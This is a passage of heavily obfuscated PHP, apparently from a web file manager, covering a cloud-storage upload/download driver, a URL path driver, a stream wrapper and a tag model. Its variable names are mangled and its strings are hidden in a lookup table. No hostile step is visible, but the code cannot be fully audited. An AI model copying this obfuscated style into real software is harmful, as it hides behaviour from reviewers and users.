$áö˜¹é[259], $Ï–Ù¥à); return $¼Š ¬•é[$áö˜¹é[1290]] ? $this->getPathOuter($àşò¤¬ò) : !1; } $Üì•Ì¾® = 1024 * 1024 * 10; $â¡à€ë§ = array($áö˜¹é[1569], $áö˜¹é[1570] . $«éßšƒÑ, $áö˜¹é[1571], $áö˜¹é[1572] . $Üì•Ì¾®); $¼Š ¬•é = $this->ussRequest($àşò¤¬ò, $áö˜¹é[259], !1, $â¡à€ë§); if (!$¼Š ¬•é[$áö˜¹é[1290]]) { return !1; } $òºÚñï„ = $¼Š ¬•é[$áö˜¹é[1280]]; $ıÎëÉÈ = 0; $ê¨½ı¬Õ = $òºÚñï„[$áö˜¹é[1573]]; $å­¸²¿â = fopen($ìâïßÚä, $áö˜¹é[1449]); if (!$å­¸²¿â) { return !1; } do { $à´ª´‚Ç = $òºÚñï„[$áö˜¹é[1574]]; fseek_64($å­¸²¿â, $ıÎëÉÈ); $Íš‹…ç“ = fread($å­¸²¿â, $à´ª´‚Ç); $È×Ê¹ÕÛ = 0; do { $È×Ê¹ÕÛ++; $òºÚñï„ = $this->uploadPart($àşò¤¬ò, $òºÚñï„, $Íš‹…ç“); } while (!$òºÚñï„ && $È×Ê¹ÕÛ < 3); if (!$òºÚñï„) { return !1; } $ê¨½ı¬Õ = $òºÚñï„[$áö˜¹é[1573]]; $ıÎëÉÈ += $à´ª´‚Ç; } while ($ê¨½ı¬Õ != -1); fclose($å­¸²¿â); $â¡à€ë§ = array($áö˜¹é[1575], $áö˜¹é[1576] . $òºÚñï„[$áö˜¹é[1577]], $áö˜¹é[1571]); $¼Š ¬•é = $this->ussRequest($àşò¤¬ò, $áö˜¹é[259], !1, $â¡à€ë§); return $¼Š ¬•é[$áö˜¹é[1290]] ? $this->getPathOuter($¶¼²Ÿà›) : !1; } private function uploadPart($¯™¨Û¼Ô, $õ¢§ë¬Û, &$£´ºŞÂ”) { $”ßùÖ =& $_SERVER[ˆ¡¹µ‹Â]; $ÈøªÑ™Û = array($”ßùÖ[1578], $”ßùÖ[1576] . $õ¢§ë¬Û[$”ßùÖ[1577]], $”ßùÖ[1579] . $õ¢§ë¬Û[$”ßùÖ[1573]], $”ßùÖ[146] . $õ¢§ë¬Û[$”ßùÖ[1574]]); $ëÖ¾“¯ = $this->ussRequest($¯™¨Û¼Ô, $”ßùÖ[259], $£´ºŞÂ”, $ÈøªÑ™Û); return !$ëÖ¾“¯[$”ßùÖ[1290]] ? $ëÖ¾“¯[$”ßùÖ[1290]] : $ëÖ¾“¯[$”ßùÖ[1280]]; } public function uploadFormData($ÁæÑÏÜó, $ƒÊÃ¬¸™ = 3600) { return $this->uploadPolicy($ÁæÑÏÜó, $ƒÊÃ¬¸™); } public function multiUploadFormData($·ÛàØÒÈ, $× ˆ¿Ü = 3600) { $ë“Ì©İÅ =& $_SERVER[ˆ¡¹µ‹Â]; $È°üú¨¿ = (int) $GLOBALS[$ë“Ì©İÅ[7]][$ë“Ì©İÅ[79]]; return $this->uploadPolicy($·ÛàØÒÈ, $× ˆ¿Ü, $È°üú¨¿); } private function uploadPolicy($šü‡ã‹í, $–óÖØ÷  = 3600, $÷‚Ñ´ô¿ = 0) { $Á¸ÍÉ°É =& $_SERVER[ˆ¡¹µ‹Â]; $íøÉª¯à = $Á¸ÍÉ°É[8] . $this->bucket; $ßÈçöî = gmdate($Á¸ÍÉ°É[1484]); $ÔÈ×­±¤ = array($Á¸ÍÉ°É[1580] => $this->bucket, $Á¸ÍÉ°É[1581] => $šü‡ã‹í, $Á¸ÍÉ°É[1582] => time() + $–óÖØ÷ , $Á¸ÍÉ°É[1583] => $ßÈçöî); if ($÷‚Ñ´ô¿) { $ÔÈ×­±¤[$Á¸ÍÉ°É[1469]] = $÷‚Ñ´ô¿; } $ÎŸ§ı’ò = base64_encode(json_encode($ÔÈ×­±¤)); $ƒÄ…ıç = base64_encode(hash_hmac($Á¸ÍÉ°É[1537], "\x50\117\123\x54\x26{$íøÉª¯à}\46{$ßÈçöî}\46{$ÎŸ§ı’ò}", md5("{$this->userpass}"), !0)); $ùı€ˆ¨Â = array($Á¸ÍÉ°É[293] => $ÎŸ§ı’ò, $Á¸ÍÉ°É[1584] => "\125\120\x59\x55\x4e\x20{$this->username}\72{$ƒÄ…ıç}", $Á¸ÍÉ°É[208] => $this->endpoint . $íøÉª¯à); return $ùı€ˆ¨Â; } public function download($§ˆŒ ’”, $¾ï‘£¿¹) { $íÚŒƒı = IO::getPathInner(IO::mkfile($¾ï‘£¿¹)); if (!($‡»ë§Êè = $this->link($§ˆŒ ’”))) { return !1; } $ŒÌÚğÉş = 0; $ÒÚ¯Ÿı§ = 1024 * 200; $²½Ö†¯ = fopen($íÚŒƒı, $_SERVER[ˆ¡¹µ‹Â][1532]); while (!0) { $ªØÇş = $this->fileSubstr($§ˆŒ ’”, $ŒÌÚğÉş, $ÒÚ¯Ÿı§); if ($ªØÇş === !1) { return !1; } fwrite($²½Ö†¯, $ªØÇş); $ŒÌÚğÉş += $ÒÚ¯Ÿı§; if (strlen($ªØÇş) < $ÒÚ¯Ÿı§) { break; } } fclose($²½Ö†¯); return $¾ï‘£¿¹; } public function link($€Ô†¶ëÉ, $°—¤ğÄ = array()) { $˜·Õö¨š =& $_SERVER[ˆ¡¹µ‹Â]; $€Ô†¶ëÉ = trim($€Ô†¶ëÉ, $˜·Õö¨š[8]); if (!empty($this->token)) { $êÕ×¬ì“ = strtotime(date($˜·Õö¨š[1585])); $´‹ëšº¾ = substr(md5($this->token . $˜·Õö¨š[360] . $êÕ×¬ì“ . $˜·Õö¨š[1586] . $€Ô†¶ëÉ), 12, 8) . $êÕ×¬ì“; $°—¤ğÄ[] = $˜·Õö¨š[1587] . $´‹ëšº¾; } $Í®Ê÷Ÿ™ = !empty($°—¤ğÄ) ? $˜·Õö¨š[76] . implode($˜·Õö¨š[360], $°—¤ğÄ) : $˜·Õö¨š[12]; return $this->getHost() . $˜·Õö¨š[8] . $€Ô†¶ëÉ . $Í®Ê÷Ÿ™; } public function fileOut($ºÉ¾Óã­, $—ˆÈ¶óÁ = false, $…£‹È™± = false, $ÄºäĞ»µ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ºÉ¾Óã­, $—ˆÈ¶óÁ, $…£‹È™±, $ÄºäĞ»µ); } if (!$…£‹È™±) { $…£‹È™± = $this->pathThis($ºÉ¾Óã­); } $û•»ıı = $—ˆÈ¶óÁ ? array($_SERVER[ˆ¡¹µ‹Â][1588] . rawurlencode($…£‹È™±)) : array(); $Úı¥·„ˆ = $this->link($ºÉ¾Óã­, $û•»ıı); $this->fileOutLink($Úı¥·„ˆ); } public function fileOutServer($µÙ¨Òİ×, $‰üËÂ–ú = false, $†‚‹’—ô = false, $ÜÈ§¶½ã = '') { parent::fileOut($µÙ¨Òİ×, $‰üËÂ–ú, $†‚‹’—ô, $ÜÈ§¶½ã); } public function fileOutImage($’ú ­ãÌ, $Õğ÷´Ïñ = 250) { $ç­­èØ = $this->link($’ú ­ãÌ . $_SERVER[ˆ¡¹µ‹Â][1589] . $Õğ÷´Ïñ); $this->fileOutLink($ç­­èØ); } public function fileOutImageServer($…©¨ğÌ, $†º¤šğ˜ = 250) { parent::fileOutImage($…©¨ğÌ, $†º¤šğ˜); } public function hashMd5($Ä“…¹—Ş) { $ĞßéÓÕ¿ =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÍ®É‘ = $this->_objectMeta($Ä“…¹—Ş); return isset($ÜÍ®É‘[$ĞßéÓÕ¿[245]]) ? $ÜÍ®É‘[$ĞßéÓÕ¿[245]] : !1; } public function size($ğ„Ï¾Æá) { $·‹‚ÛçÍ = $this->objectMeta($ğ„Ï¾Æá); return $·‹‚ÛçÍ ? $·‹‚ÛçÍ[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function info($›ƒ’ıŞ) { if ($this->isFolder($›ƒ’ıŞ)) { return $this->folderInfo($›ƒ’ıŞ); } else { if ($this->isFile($›ƒ’ıŞ)) { return $this->fileInfo($›ƒ’ıŞ); } } return !1; } public function exist($Á‡Ø¤Ó) { return $this->isFile($Á‡Ø¤Ó) || $this->isFolder($Á‡Ø¤Ó); } public function isFile($¬‡…èí) { return !$this->isFolder($¬‡…èí) && $this->objectMeta($¬‡…èí); } public function isFolder($Œğ¥œ²™) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][179], $Œğ¥œ²™); } protected function objectMeta($ø»„ãûÈ) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][181], $ø»„ãûÈ); } protected function _objectMeta($‰´¬¬Ëù) { $¢‡…Ñş =& $_SERVER[ˆ¡¹µ‹Â]; if ($‰´¬¬Ëù == $¢‡…Ñş[12] || $‰´¬¬Ëù == $¢‡…Ñş[8]) { return array(); } $Ğü¨›Ú— = $this->ussRequest($‰´¬¬Ëù, $¢‡…Ñş[1590]); if (!$Ğü¨›Ú—[$¢‡…Ñş[1290]]) { return null; } $÷ÔÉïğç = isset($Ğü¨›Ú—[$¢‡…Ñş[1280]]) ? $Ğü¨›Ú—[$¢‡…Ñş[1280]] : array(); if (!isset($÷ÔÉïğç[$¢‡…Ñş[1591]])) { return null; } $ğû ÈŞô = array($¢‡…Ñş[33] => isset($÷ÔÉïğç[$¢‡…Ñş[1591]]) ? $÷ÔÉïğç[$¢‡…Ñş[1591]] : null, $¢‡…Ñş[79] => isset($÷ÔÉïğç[$¢‡…Ñş[1592]]) ? $÷ÔÉïğç[$¢‡…Ñş[1592]] : null, $¢‡…Ñş[245] => isset($÷ÔÉïğç[$¢‡…Ñş[1593]]) ? $÷ÔÉïğç[$¢‡…Ñş[1593]] : null, $¢‡…Ñş[1560] => isset($÷ÔÉïğç[$¢‡…Ñş[1594]]) ? $÷ÔÉïğç[$¢‡…Ñş[1594]] : null); $ğû ÈŞô[$¢‡…Ñş[1561]] = isset($÷ÔÉïğç[$¢‡…Ñş[1595]]) ? strtotime($÷ÔÉïğç[$¢‡…Ñş[1595]]) : $ğû ÈŞô[$¢‡…Ñş[1560]]; return $ğû ÈŞô; } protected function _isFolder($œÖ¼ø–) { $±Ñ¢şº =& $_SERVER[ˆ¡¹µ‹Â]; if ($œÖ¼ø– == $±Ñ¢şº[12] || $œÖ¼ø– == $±Ñ¢şº[8]) { return !0; } $¨àˆÎ¿ = $this->_objectMeta($œÖ¼ø–); return isset($¨àˆÎ¿[$±Ñ¢şº[33]]) && $¨àˆÎ¿[$±Ñ¢şº[33]] == $±Ñ¢şº[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($§êœ÷á¨ = false) { } public function exist($Øâİ°È”) { $ÄÉéæÚõ = $this->info($Øâİ°È”); return $ÄÉéæÚõ[$_SERVER[ˆ¡¹µ‹Â][232]]; } public function isFile($£¦õ¬ß) { $ÆÅëüÎÆ = $this->info($£¦õ¬ß); return $ÆÅëüÎÆ[$_SERVER[ˆ¡¹µ‹Â][232]]; } public function isFolder($Ã™ğ¾š¯) { return !1; } public function size($ı’‡¿…) { $‘ ÂÒÌ = $this->info($ı’‡¿…); return $‘ ÂÒÌ[$_SERVER[ˆ¡¹µ‹Â][79]]; } public function info($¬±ÕÅŞ) { return $this->infoParse($¬±ÕÅŞ); } public function infoAuth($¿Ó¾¦ò) { return $this->infoParse($¿Ó¾¦ò); } public function infoWithChildren($šşàÑ‹“) { return $this->infoParse($šşàÑ‹“); } public function infoFull($µ»¦ìâÑ) { return $this->infoParse($µ»¦ìâÑ); } private function infoParse($¿åÌ½Î) { $ää€æ•ä =& $_SERVER[ˆ¡¹µ‹Â]; $àÁªúÈ = $this->header($¿åÌ½Î); if (!$àÁªúÈ || !$àÁªúÈ[$ää€æ•ä[817]]) { return !1; } $Ãú™» = _get($àÁªúÈ, $ää€æ•ä[413], 0); $åÀëòÕé = array($ää€æ•ä[32] => $àÁªúÈ[$ää€æ•ä[32]], $ää€æ•ä[87] => $¿åÌ½Î, $ää€æ•ä[33] => $ää€æ•ä[230], $ää€æ•ä[79] => intval($Ãú™»), $ää€æ•ä[169] => get_path_ext($àÁªúÈ[$ää€æ•ä[32]]), $ää€æ•ä[1446] => $Ãú™» > 0 && $àÁªúÈ[$ää€æ•ä[1596]], $ää€æ•ä[1447] => !1); return $åÀëòÕé; } private function header($ûÀ¡¨¡¨) { $¦„ã‡»… =& $_SERVER[ˆ¡¹µ‹Â]; if (isset(self::$_cacheHeader[$ûÀ¡¨¡¨])) { return self::$_cacheHeader[$ûÀ¡¨¡¨]; } $¦ì‰¤¡“ = isset($GLOBALS[$¦„ã‡»…[1597]]) ? $GLOBALS[$¦„ã‡»…[1597]] : !1; $GLOBALS[$¦„ã‡»…[1597]] = !0; self::$_cacheHeader[$ûÀ¡¨¡¨] = url_header($ûÀ¡¨¡¨); $GLOBALS[$¦„ã‡»…[1597]] = $¦ì‰¤¡“; return self::$_cacheHeader[$ûÀ¡¨¡¨]; } public function hashSimple($ÁŞ¥©›¦, $ñªšŒĞ¾ = false) { $óÍìª‚ =& $_SERVER[ˆ¡¹µ‹Â]; $ïıææ‡¹ = $this->info($ÁŞ¥©›¦); if (!$ïıææ‡¹ || !$ïıææ‡¹[$óÍìª‚[232]]) { return !1; } $²ü­·Úé = $ïıææ‡¹[$óÍìª‚[79]]; $ŸŒ•ÈØ¸ = 200; $—Ö¼ÚÀ¾ = 50; if ($²ü­·Úé <= $ŸŒ•ÈØ¸ * $—Ö¼ÚÀ¾) { return md5($this->fileSubstr($ÁŞ¥©›¦, 0, $²ü­·Úé)) . $²ü­·Úé; } $áı‚Ÿ—™ = intval($²ü­·Úé / $—Ö¼ÚÀ¾); $ß—Ó˜ = $óÍìª‚[12]; $¯ë—§ŒÒ = timeFloat(); $”¶…§à = 15; for ($Ô°ë´Ù = 0; $Ô°ë´Ù < $—Ö¼ÚÀ¾; $Ô°ë´Ù++) { if (timeFloat() - $¯ë—§ŒÒ > $”¶…§à) { return !1; } $³‰è–Ø = $this->fileSubstr($ÁŞ¥©›¦, $áı‚Ÿ—™ * $Ô°ë´Ù, $ŸŒ•ÈØ¸); if (!$³‰è–Ø) { return !1; } $ß—Ó˜ .= $³‰è–Ø; } $ß—Ó˜ .= $this->fileSubstr($ÁŞ¥©›¦, $²ü­·Úé - $ŸŒ•ÈØ¸, $ŸŒ•ÈØ¸); return md5($ß—Ó˜) . $²ü­·Úé; } public function getContent($ìêŠ•İÍ) { return $this->fileSubstr($ìêŠ•İÍ); } public function fileSubstr($ò¶ÁÆ¡, $Âßì¨Àî = 0, $Æ¯è¬›¦ = -1) { $Œ‘÷›î„ =& $_SERVER[ˆ¡¹µ‹Â]; $ìõ»´œ = $this->info($ò¶ÁÆ¡); if (!$ìõ»´œ || !$ìõ»´œ[$Œ‘÷›î„[232]] && $ìõ»´œ[$Œ‘÷›î„[79]] > 1024 * 1024 * 10) { return !1; } if ($Æ¯è¬›¦ === -1) { $Æ¯è¬›¦ = $ìõ»´œ[$Œ‘÷›î„[79]]; } if ($Æ¯è¬›¦ == 0) { return $Œ‘÷›î„[12]; } $Õ÷şå÷ = array($Œ‘÷›î„[1598] . $Âßì¨Àî . $Œ‘÷›î„[860] . ($Âßì¨Àî + $Æ¯è¬›¦ - 1)); $¦ÈÄÀéù = url_request($ò¶ÁÆ¡, $Œ‘÷›î„[261], !1, $Õ÷şå÷, !1, !1, 30); return $¦ÈÄÀéù[$Œ‘÷›î„[1280]] ? $¦ÈÄÀéù[$Œ‘÷›î„[1280]] : $Œ‘÷›î„[12]; } public function download($‰‰¨³µ, $¯¬ëø) { Downloader::start($‰‰¨³µ, $¯¬ëø); return $¯¬ëø; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ÁïƒØÕå, $¤ŒŸÇ‹Ù = '') { $this->info = $this->info($ÁïƒØÕå); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ˆ¡¹µ‹Â][87]]; $this->pathOpen = $ÁïƒØÕå; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ÁïƒØÕå])) { self::$_chunkBuffer[$ÁïƒØÕå] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ó„¿¶¡ã) { $­è–‰é = $this->fileSubstr($this->pose, $ó„¿¶¡ã); $this->pose += strlen($­è–‰é); return $­è–‰é; } public function stream_tell() { return $this->pose; } public function stream_seek($ÖñäŠ—«, $¾°ÆÂ¶) { $ãè†Óšã =& $_SERVER[ˆ¡¹µ‹Â]; if ($¾°ÆÂ¶ == SEEK_SET) { $this->pose = $ÖñäŠ—«; } else { if ($¾°ÆÂ¶ == SEEK_CUR) { $this->pose += $ÖñäŠ—«; } else { if ($¾°ÆÂ¶ == SEEK_END) { $this->pose = $this->info[$ãè†Óšã[79]] + intval($ÖñäŠ—«); } } } if ($ÖñäŠ—« < 0) { $this->pose = $this->info[$ãè†Óšã[79]] + $ÖñäŠ—«; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ˆ¡¹µ‹Â][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÜÚ˜é, $ ¸ÙŠ‹©) { $Ó÷Ó‰£Ö =& $_SERVER[ˆ¡¹µ‹Â]; $ÒÄ×óİş = $this->info($ÜÚ˜é); return array($Ó÷Ó‰£Ö[1599] => 0, $Ó÷Ó‰£Ö[1600] => 0, $Ó÷Ó‰£Ö[16] => 32768 + 511, $Ó÷Ó‰£Ö[1601] => 0, $Ó÷Ó‰£Ö[1602] => 0, $Ó÷Ó‰£Ö[1603] => 0, $Ó÷Ó‰£Ö[1604] => 0, $Ó÷Ó‰£Ö[79] => $ÒÄ×óİş[$Ó÷Ó‰£Ö[79]], $Ó÷Ó‰£Ö[1605] => $ÒÄ×óİş[$Ó÷Ó‰£Ö[1445]], $Ó÷Ó‰£Ö[1561] => $ÒÄ×óİş[$Ó÷Ó‰£Ö[88]], $Ó÷Ó‰£Ö[1560] => $ÒÄ×óİş[$Ó÷Ó‰£Ö[231]], $Ó÷Ó‰£Ö[1606] => 0, $Ó÷Ó‰£Ö[1607] => 0); } static $fileInfo = array(); public function info($™ªû†ÈŒ) { $ÚÃéëüŠ = $_SERVER[ˆ¡¹µ‹Â][1608]; if (isset(self::$fileInfo[$™ªû†ÈŒ])) { return self::$fileInfo[$™ªû†ÈŒ]; } if (substr($™ªû†ÈŒ, 0, strlen($ÚÃéëüŠ)) != $ÚÃéëüŠ) { return !1; } self::$fileInfo[$™ªû†ÈŒ] = IO::info(substr($™ªû†ÈŒ, strlen($ÚÃéëüŠ))); return self::$fileInfo[$™ªû†ÈŒ]; } public static function read($÷›˜ùãò, $Ëöœªœ‰, $¦ÜÑÊ) { if (!isset(self::$_fopenCache[$÷›˜ùãò])) { $–°ÂŸãë = new StreamWrapperIO(); $–°ÂŸãë->stream_open($÷›˜ùãò); self::$_fopenCache[$÷›˜ùãò] = $–°ÂŸãë; } $–°ÂŸãë = self::$_fopenCache[$÷›˜ùãò]; return $–°ÂŸãë->fileSubstr($Ëöœªœ‰, $¦ÜÑÊ); } public static function _read($£È‹ª, $½˜÷Ç‹€, $ú£êŠå­) { $ûÑ†ìÁ =& $_SERVER[ˆ¡¹µ‹Â]; $ñ÷ÊËĞ = fopen($£È‹ª, $ûÑ†ìÁ[1449]); if (!$ñ÷ÊËĞ) { return $ûÑ†ìÁ[12]; } $ÙÙÂŠ“ê = 8192; fseek($ñ÷ÊËĞ, $½˜÷Ç‹€, SEEK_SET); $ñ¥¦Ü×š = $ûÑ†ìÁ[12]; $ÕÕî‹ï = 0; while ($ÕÕî‹ï < $ú£êŠå­) { $¦«„š‰ç = min($ÙÙÂŠ“ê, $ú£êŠå­ - $ÕÕî‹ï); $ñ¥¦Ü×š .= fread($ñ÷ÊËĞ, $¦«„š‰ç); $ÕÕî‹ï += $¦«„š‰ç; } fclose($ñ÷ÊËĞ); return $ñ¥¦Ü×š; } public function fileSubstr($ğû²–—Ú, $äëãÑƒâ) { $â¬°²—× =& $_SERVER[ˆ¡¹µ‹Â]; $ü¹Ø¯¨Œ = $this->info[$â¬°²—×[79]]; $Ë÷»÷ŒÁ = $ğû²–—Ú; $Õ›ÙŒˆ = $äëãÑƒâ; if ($ğû²–—Ú < 0) { $ğû²–—Ú = $ü¹Ø¯¨Œ + $ğû²–—Ú; } if ($äëãÑƒâ === !1) { $äëãÑƒâ = $ü¹Ø¯¨Œ - $ğû²–—Ú; } if ($ğû²–—Ú + $äëãÑƒâ > $ü¹Ø¯¨Œ) { $äëãÑƒâ = $ü¹Ø¯¨Œ - $ğû²–—Ú; } if ($äëãÑƒâ <= 0) { return $â¬°²—×[12]; } if ($ğû²–—Ú < 0 || $ğû²–—Ú >= $ü¹Ø¯¨Œ || $äëãÑƒâ <= 0 || $äëãÑƒâ > 1024 * 1024 * 10) { throw new Exception("\151\157\x46\151\154\x65\x52\145\141\x64\40\x65\162\x72\x6f\x72\x21\40\x73\164\141\x72\x74\75{$ğû²–—Ú}\x3b\x6c\145\156\147\164\150\75{$äëãÑƒâ}\73\x20\163\x69\x7a\145\75{$ü¹Ø¯¨Œ}\73"); } $÷í×¤õó = 64 * 1024; $”ÉßÕÔï =& self::$_chunkBuffer[$this->path]; if (!$”ÉßÕÔï) { $”ÉßÕÔï = array(); } $¶œ…î•î = 0; $†ñ×ôÀ™ = 0; $©µÅ°Ù€ = $â¬°²—×[12]; foreach ($”ÉßÕÔï as $¶œ…î•î => $©µÅ°Ù€) { $¶œ…î•î = intval($¶œ…î•î); $†ñ×ôÀ™ = $¶œ…î•î + strlen($©µÅ°Ù€); if ($ğû²–—Ú >= $†ñ×ôÀ™) { continue; } if ($ğû²–—Ú >= $¶œ…î•î && $ğû²–—Ú + $äëãÑƒâ <= $†ñ×ôÀ™) { return substr($©µÅ°Ù€, $ğû²–—Ú - $¶œ…î•î, $äëãÑƒâ); } break; } if (count($”ÉßÕÔï) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($â¬°²—×[1609], $â¬°²—×[1610] . count($”ÉßÕÔï) . "\73\163\x74\141\x72\164\x3d{$ğû²–—Ú}\x2c\x6c\145\156\147\164\150\x3d{$äëãÑƒâ}\x3b\160\157\x73\145\72{$¶œ…î•î}\x7e{$†ñ×ôÀ™}"); throw new Exception($â¬°²—×[1611]); } $´ùªÔ£Ú = intval($ğû²–—Ú / $÷í×¤õó) * $÷í×¤õó; $Ì££ªÈã = ceil(($ğû²–—Ú + $äëãÑƒâ) / $÷í×¤õó) * $÷í×¤õó - $´ùªÔ£Ú; $–Ò¹´ò¡ = IO::fileSubstr($this->path, $´ùªÔ£Ú, $Ì££ªÈã); $”ÉßÕÔï[$´ùªÔ£Ú . $â¬°²—×[12]] = $–Ò¹´ò¡; ksort($”ÉßÕÔï); $˜ÚŸ˜£¾ = substr($–Ò¹´ò¡, $ğû²–—Ú - $´ùªÔ£Ú, $äëãÑƒâ); return $˜ÚŸ˜£¾; } private function log($ÚÅ½°„û, $ÄÃ——ı) { $À¡ôêÉ™ =& $_SERVER[ˆ¡¹µ‹Â]; $‹ŒÍñª• = timeFloat() - $this->timeStart; write_log(sprintf($À¡ôêÉ™[1612], $ÚÅ½°„û, $this->info[$À¡ôêÉ™[32]], $‹ŒÍñª•, $ÄÃ——ı), $À¡ôêÉ™[1257]); } } goto AÈª—³ìÈƒ; fÈ‹Œ×ß‡: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\166"; protected function cacheFunctionAlias($Íõ·‹éñ) { $òÒŠ¨á =& $_SERVER[ˆ¡¹µ‹Â]; return array($òÒŠ¨á[2077] => array($òÒŠ¨á[2497] . USER_ID, $òÒŠ¨á[2078])); } protected function listData() { $ô²æò =& $_SERVER[ˆ¡¹µ‹Â]; $“­ÃâÄ = array($ô²æò[1754] => USER_ID, $ô²æò[557] => array($ô²æò[2081], 0)); $ûûõçüŞ = $ô²æò[2498]; $‚õÀÔ÷ô = $this->field($ûûõçüŞ)->where($“­ÃâÄ)->order($ô²æò[2084])->select(); return $‚õÀÔ÷ô ? $‚õÀÔ÷ô : array(); } protected function addToTag($€Ü÷×¼Ç, $ûÀ»¿£Ò) { $„Ã¹±‡ =& $_SERVER[ˆ¡¹µ‹Â]; if (!Model($„Ã¹±‡[2229])->listData($ûÀ»¿£Ò)) { return !1; } if (is_numeric($€Ü÷×¼Ç)) { $Ğ²úöê  = Model($„Ã¹±‡[899])->pathInfo($€Ü÷×¼Ç); if (!$Ğ²úöê ) { return !1; } } else { $Ğ²úöê  = IO::infoSimple($€Ü÷×¼Ç); if (!$Ğ²úöê ) { return !1; } $å³êŸÉ = $Ğ²úöê [$„Ã¹±‡[32]]; $©Û¹ıÌã = $Ğ²úöê [$„Ã¹±‡[33]]; if (isset($Ğ²úöê [$„Ã¹±‡[485]])) { $©Û¹ıÌã = $Ğ²úöê [$„Ã¹±‡[485]] == $„Ã¹±‡[91] ? $„Ã¹±‡[78] : $„Ã¹±‡[230]; } } $ïîÇà‡ = array($„Ã¹±‡[1754] => USER_ID, $„Ã¹±‡[557] => $ûÀ»¿£Ò, $„Ã¹±‡[495] => $€Ü÷×¼Ç, $„Ã¹±‡[496] => $©Û¹ıÌã ? $©Û¹ıÌã : $„Ã¹±‡[490], $„Ã¹±‡[494] => $å³êŸÉ ? $å³êŸÉ : $„Ã¹±‡[12], $„Ã¹±‡[1966] => 0); if ($this->where($ïîÇà‡)->find()) { return !1; } return $this->add($ïîÇà‡); } protected function removeFromTag($ú¾Õ‹¬Ä, $ÏÁü¥´•) { $¡úéÍâñ =& $_SERVER[ˆ¡¹µ‹Â]; if (!Model($¡úéÍâñ[2229])->listData($ÏÁü¥´•)) { return !1; } if (is_array($ú¾Õ‹¬Ä)) { $ú¾Õ‹¬Ä = array($¡úéÍâñ[7], $ú¾Õ‹¬Ä); } $ˆª’İï = array($¡úéÍâñ[1754] => USER_ID, $¡úéÍâñ[557] => $ÏÁü¥´•, $¡úéÍâñ[495] => $ú¾Õ‹¬Ä); return $this->where($ˆª’İï)->delete(); } protected function removeByTag($º‚©ºä½) { $º«Í…Ùö =& $_SERVER[ˆ¡¹µ‹Â]; if (!$º‚©ºä½) { return !1; } $±œŸúÒõ = array($º«Í…Ùö[1754] => USER_ID, $º«Í…Ùö[557] => $º‚©ºä½); return $this->where($±œŸúÒõ)->delete(); } protected function removeBySource($çÏô¨¡²) { $Ì‚Ã¿½ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_array($çÏô¨¡²)) { $çÏô¨¡² = array($Ì‚Ã¿½[7], $çÏô¨¡²); } $ò‹Š”ÁŒ = array($Ì‚Ã¿½[1754] => USER_ID, $Ì‚Ã¿½[557] => array($Ì‚Ã¿½[1085], 0), $Ì‚Ã¿½[495] => $çÏô¨¡²); return $this->where($ò‹Š”ÁŒ)->delete(); } }